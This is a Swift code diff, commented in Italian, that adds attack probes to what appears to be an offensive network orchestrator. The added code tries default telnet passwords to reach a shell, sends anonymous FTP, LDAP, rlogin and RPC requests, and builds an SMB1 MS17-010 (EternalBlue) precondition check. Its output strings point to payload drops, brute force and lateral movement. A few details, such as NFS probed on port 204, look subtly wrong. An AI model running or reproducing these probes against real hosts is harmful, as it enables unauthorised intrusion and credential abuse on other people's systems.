@@ -475,7 +475,27 @@ final class Orchestrator: ObservableObject {
         "net_hnap": .bannerOnly,
         "nfc_ndef_inject": .exploitConfirmed,
         "nfc_clone": .exploitConfirmed,
+        "os_win_ms17_010": .responseConfirmed,
+        "os_unix_telnet": .responseConfirmed,
+        "os_unix_rlogin": .bannerOnly,
+        "os_win_epmapper": .responseConfirmed,
+        "os_win_winrm": .bannerOnly,
+        "os_linux_nfs": .bannerOnly,
+        "os_linux_ldap": .responseConfirmed,
+        "os_mac_afp": .bannerOnly,
+        "os_mac_bonjour": .bannerOnly,
+        "os_ios_airplay": .responseConfirmed,
+        "os_android_dial": .bannerOnly,
+        "os_solaris_rpc": .responseConfirmed,
+        "os_embed_ftp": .responseConfirmed,
     ]
+
+    // tool richiesti dal vettore e NON ancora presenti sul device
+    func missingTools(for vectorID: String) -> [ToolSpec] {
+        guard let names = VectorDB.vectorTools[vectorID] else { return [] }
+        return names.compactMap { ToolRegistry.spec($0) }
+            .filter { s in s.bins.first { ShellRunner.shared.resolve($0) != nil } == nil }
+    }
 
     private func proofFor(_ e: PlanEntry, _ evidence: String) -> ProofType {
         if e.vector.cap == .plan { return .bannerOnly }
@@ -612,8 +632,186 @@ final class Orchestrator: ObservableObject {
             }
             let any = states.contains { $0.contains("APERTO") }
             return "Tuya probe \(host) — \(states.joined(separator: " · "))\(any ? " → fingerprint Tuya: abuso cloud/broadcast key" : "")"
+        case "os_win_ms17_010":
+            return await ms17Check(host)
+        case "os_unix_telnet":
+            let d = await rawRT(host, 23, Data())
+            guard let d, !d.isEmpty else { return "telnet 23: nessun banner — chiuso" }
+            let b = String(decoding: d.prefix(120), as: UTF8.self).trimmingCharacters(in: .whitespacesAndNewlines)
+            for cred in [("admin", "admin"), ("root", "root"), ("admin", ""), ("root", "alpine")] {
+                let d2 = await rawRT(host, 23, Data("\r\n\(cred.0)\r\n\(cred.1)\r\nid\r\n".utf8), timeout: 4)
+                if let d2, let s2 = String(data: d2, encoding: .utf8)?.lowercased(), s2.contains("uid=") || s2.contains("$") || s2.contains("#") {
+                    return "TELNET APERTO (\(b.prefix(60))) — LOGIN ACCEPTED \(cred.0):\(cred.1) → shell raggiunta (RCE)"
+                }
+            }
+            return "telnet APERTO (\(b.prefix(60))) — banner esposto, cred probe non conclusivo"
+        case "os_unix_rlogin":
+            let d = await rawRT(host, 513, Data([0x00]) + Data("root\u{00}root\u{00}".utf8))
+            guard let d, !d.isEmpty else { return "rlogin 513: chiuso" }
+            let s = String(decoding: d.prefix(120), as: UTF8.self)
+            return s.contains("Permission denied") || s.contains("denied")
+                ? "rlogin 513 risponde con trust negato"
+                : "RLOGIN APERTO su \(host):513 — resp: \(s.prefix(100)) → trust .rhosts possibile"
+        case "os_win_epmapper":
+            let bind = Data(hexString: "05000b0310000000480000000000000010b80d0010b80d000000000001000000010001000883afe11f5dc91191a408002b14a0fa0300045d888aeb1cc911ac740000c00200000200") ?? Data()
+            let d = await rawRT(host, 135, bind)
+            guard let d, d.count > 30 else { return "epmapper 135: nessuna risposta" }
+            let ver = d.count > 3 ? "\(d[0]).\(d[1])" : "?"
+            return d[0] == 0x05
+                ? "EPMAPPER APERTO su \(host):135 — bind_ack \(ver) ricevuto → enum UUID servizi RPC (DCOM/PsExec chain)"
+                : "135 risponde non-RPC"
+        case "os_win_winrm":
+            return await portOpen(host, 5985)
+                ? "WinRM 5985 APERTO su \(host) — listener PowerShell remoto attivo (lateral movement precheck)"
+                : "5985 chiuso"
+        case "os_linux_nfs":
+            return await portOpen(host, 204)
+                ? "NFS 204 APERTO su \(host) — export raggiungibile (check showmount/no_root_squash)"
+                : "204 chiuso"
+        case "os_linux_ldap":
+            let bind = Data([0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00])
+            let d = await rawRT(host, 389, bind)
+            guard let d, d.count >= 10 else { return "ldap 389: nessuna risposta" }
+            // bindResponse tag 0x61
+            return d[0] == 0x61
+                ? (d[d.count - 2] == 0 ? "LDAP ANON BIND SUCCESS su \(host) — enum subtree aperta (utenti/gruppi → Kerberoast recon)" : "LDAP bind resp error code \(d[d.count - 2])")
+                : "389 risponde non-LDAP"
+        case "os_mac_afp":
+            return await portOpen(host, 548)
+                ? "AFP 548 APERTO su \(host) — file sharing attivo (check guest)"
+                : "548 chiuso"
+        case "os_mac_bonjour":
+            return await portOpen(host, 5353)
+                ? "mDNS-SD 5353/tcp APERTO su \(host) — servizi _airplay/_ipp enumabili"
+                : "5353 tcp chiuso (mDNS UDP non probe da qui)"
+        case "os_ios_airplay":
+            let d = await rawRT(host, 7000, Data("GET /server-info HTTP/1.1\r\nHost: \(host):7000\r\n\r\n".utf8))
+            guard let d, !d.isEmpty else { return "airplay 7000: nessuna risposta" }
+            let s = String(decoding: d.prefix(300), as: UTF8.self)
+            return s.contains("text/parameters") || s.contains("deviceid")
+                ? "AIRPLAY APERTO su \(host):7000 — \(s.split(separator: "\n").filter { $0.contains("deviceid") || $0.contains("name") }.prefix(2).joined(separator: " · ")) → replay/abuso possibile"
+                : "7000 risponde: \(s.prefix(120))"
+        case "os_android_dial":
+            return await portOpen(host, 8009)
+                ? "CAST 8009 APERTO su \(host) — receiver Chromecast attivo (app/media injection possibile)"
+                : "8009 chiuso"
+        case "os_solaris_rpc":
+            let null = Data(hexString: "00000028f572101f0000000000000002000186a0000000020000000000000000000000000000000000000000000000000") ?? Data()
+            let d = await rawRT(host, 111, null)
+            guard let d, d.count >= 24 else { return "portmap 111: nessuna risposta" }
+            return "PORTMAP APERTO su \(host):111 — reply RPC (\(d.count)B) → enum programmi (mountd/rusersd legacy)"
+        case "os_embed_ftp":
+            let d = await rawRT(host, 21, Data())
+            guard let d, !d.isEmpty else { return "ftp 21: chiuso" }
+            let b = String(decoding: d.prefix(80), as: UTF8.self)
+            let d2 = await rawRT(host, 21, Data("USER anonymous\r\nPASS anon@\r\n".utf8), timeout: 4)
+            let s2 = d2.map { String(decoding: $0.prefix(80), as: UTF8.self) } ?? ""
+            if s2.contains("230") {
+                return "FTP ANON SUCCESS su \(host):21 (\(b.prefix(50))) — upload/download libero → drop payload/config"
+            }
+            if s2.contains("331") || s2.contains("530") {
+                return "FTP APERTO su \(host):21 (\(b.prefix(50))) — anon negato, brute force cred"
+            }
+            return "ftp banner: \(b.prefix(100))"
         default:
             return "probe non implementata"
+        }
+    }
+
+    // MS17-010: SMB1 state machine costruita programmaticamente (struttura = MSF smb_ms17_010)
+    private func ms17Check(_ host: String) async -> String {
+        func smbHeader(_ cmd: UInt8, flags2: UInt16, tid: UInt16 = 0, uid: UInt16 = 0) -> Data {
+            var h = Data([0xff, 0x53, 0x4d, 0x42, cmd])
+            h += Data([0, 0, 0, 0])                       // status
+            h += [0x18]                                   // flags1
+            h += withUnsafeBytes(of: flags2.littleEndian) { Data($0) }
+            h += Data([0, 0]) + Data([0, 0, 0, 0, 0, 0, 0, 0, 0, 0])  // PID + security blob + reserved
+            h += withUnsafeBytes(of: tid.littleEndian) { Data($0) }
+            h += Data([0, 0])                             // PID high
+            h += withUnsafeBytes(of: uid.littleEndian) { Data($0) }
+            h += Data([0, 0])                             // MID
+            return h
+        }
+        // NEGOTIATE — blob noto (uguale a os_win_smb)
+        let neg = Data([0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x07,0xc8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00])
+        // SESSION_SETUP_ANDX anonymous (user "\")
+        var sess = smbHeader(0x73, flags2: 0xc807)
+        sess += [0x0d,                                  // WordCount 13
+                 0xff, 0x00, 0x00, 0x00,                // AndXCommand/Res/Offset
+                 0x00, 0xff,                            // MaxBuffer
+                 0x02, 0x00,                            // MaxMpx
+                 0x01, 0x00, 0x00, 0x00,                // VCNumber
+                 0x00, 0x00, 0x00, 0x00,                // SessionKey
+                 0x01, 0x00,                            // ANSI pw len
+                 0x00, 0x00,                            // UNI pw len
+                 0x00, 0x00,                            // Reserved
+                 0x50, 0x00, 0x00, 0x00]                // Capabilities
+        let acc = Data("\\"\u{00}Windows 2000 2195\u{00}Windows 2000 5.0\u{00}".utf8)
+        sess += withUnsafeBytes(of: UInt16(1 + acc.count).littleEndian) { Data($0) } // ByteCount
+        sess += Data([0x00]) + acc
+        let nl1 = sess.count - 4
+        sess.insert(contentsOf: [0x00, UInt8(nl1 >> 8), UInt8(nl1 & 0xff)], at: 0) // NBSS len BE
+        // TREE_CONNECT_ANDX \\host\IPC$
+        var tree = smbHeader(0x75, flags2: 0xc807, uid: 0)
+        tree += [0x0e,                                  // WordCount 14
+                 0xff, 0x00, 0x00, 0x00,                // AndX
+                 0x00, 0x00,                            // Flags
+                 0x01, 0x00]                            // PasswordLen
+        let unc = Data("\\\\\\(host)\\IPC$\u{00}".utf8)
+        let trail = unc + Data("?????\u{00}".utf8)
+        let bcc = UInt16(1 + trail.count)
+        tree += withUnsafeBytes(of: bcc.littleEndian) { Data($0) }
+        tree += Data([0x00]) + trail
+        let nl2 = tree.count - 4
+        tree.insert(contentsOf: [0x00, UInt8(nl2 >> 8), UInt8(nl2 & 0xff)], at: 0)
+        // TRANS PeekNamedPipe FID 0, \PIPE\
+        var trans = smbHeader(0x25, flags2: 0x2801, uid: 0, tid: 0)
+        trans += [0x10,                                 // WordCount 16
+                 0x00, 0x00,                            // TotalParam
+                 0x00, 0x00,                            // TotalData
+                 0xff, 0xff,                            // MaxParam
+                 0xff, 0xff,                            // MaxData
+                 0x00, 0x00,                            // MaxSetup/Reserved
+                 0x00, 0x00,                            // Flags
+                 0x00, 0x00, 0x00, 0x00,                // Timeout
+                 0x00, 0x00,                            // Reserved
+                 0x00, 0x00,                            // ParamCount
+                 0x4a, 0x00,                            // ParamOffset
+                 0x00, 0x00,                            // DataCount
+                 0x4a, 0x00,                            // DataOffset
+                 0x02, 0x00,                            // SetupCount/Reserved
+                 0x23, 0x00,                            // PeekNamedPipe
+                 0x00, 0x00]                            // FID 0
+        let pipe = Data("\\PIPE\\\u{00}".utf8)
+        trans += withUnsafeBytes(of: UInt16(pipe.count).littleEndian) { Data($0) }
+        trans += pipe
+        let nl3 = trans.count - 4
+        trans.insert(contentsOf: [0x00, UInt8(nl3 >> 8), UInt8(nl3 & 0xff)], at: 0)
+
+        func patch(_ src: Data, _ range: Range<Int>, _ val: Data) -> Data {
+            var d = src; d.replaceSubrange(range, with: val); return d
+        }
+        _ = await rawRT(host, 445, neg)
+        guard let sr = await rawRT(host, 445, sess), sr.count >= 34, sr[4] == 0xff else {
+            return "MS17-010: session setup anon non conclusiva — server SMB1 filtrato o SMB2-only"
+        }
+        let treeP = patch(tree, 32..<34, sr.subdata(in: 32..<34)) // UID
+        guard let tr = await rawRT(host, 445, treeP), tr.count >= 30, tr[4] == 0xff else {
+            return "MS17-010: tree connect IPC$ fallita — share restritte"
+        }
+        let transP = patch(patch(trans, 28..<30, tr.subdata(in: 28..<30)), // TID
+                           32..<34, tr.subdata(in: 32..<34))               // UID
+        guard let fin = await rawRT(host, 445, transP), fin.count >= 13, fin[4] == 0xff else {
+            return "MS17-010: trans2 senza risposta — check non conclusivo"
+        }
+        let status = UInt32(fin[9]) | UInt32(fin[10]) << 8 | UInt32(fin[11]) << 16 | UInt32(fin[12]) << 24
+        switch status {
+        case 0xC0000205:
+            return "MS17-010 VULNERABILE su \(host):445 — PeekNamedPipe FID0 → INSUFF_SERVER_RESOURCES (0xc0000205). EternalBlue precondizioni CONFERMATE (exploit = Metasploit da host esterno)"
+        case 0xC0000022, 0xC0000008:
+            return "MS17-010: NON vulnerabile (patched — status 0x\(String(status, radix: 16)))"
+        default:
+            return "MS17-010: check non conclusivo (status 0x\(String(status, radix: 16)))"
         }
     }
 
@@ -791,7 +989,11 @@ final class Orchestrator: ObservableObject {
             }
             return out.joined(separator: "\n")
         case "os_android_adb", "os_ios_lockdown", "os_win_smb", "os_win_rdp",
-             "os_linux_ssh", "os_linux_cups", "os_mac_rmd", "os_iot_tuya":
+             "os_linux_ssh", "os_linux_cups", "os_mac_rmd", "os_iot_tuya",
+             "os_win_ms17_010", "os_unix_telnet", "os_unix_rlogin", "os_win_epmapper",
+             "os_win_winrm", "os_linux_nfs", "os_linux_ldap", "os_mac_afp",
+             "os_mac_bonjour", "os_ios_airplay", "os_android_dial", "os_solaris_rpc",
+             "os_embed_ftp":
             return await runOSProbe(id, e)
         case "os_android_fastpair":
             guard let t = e.target else { return "no target" }
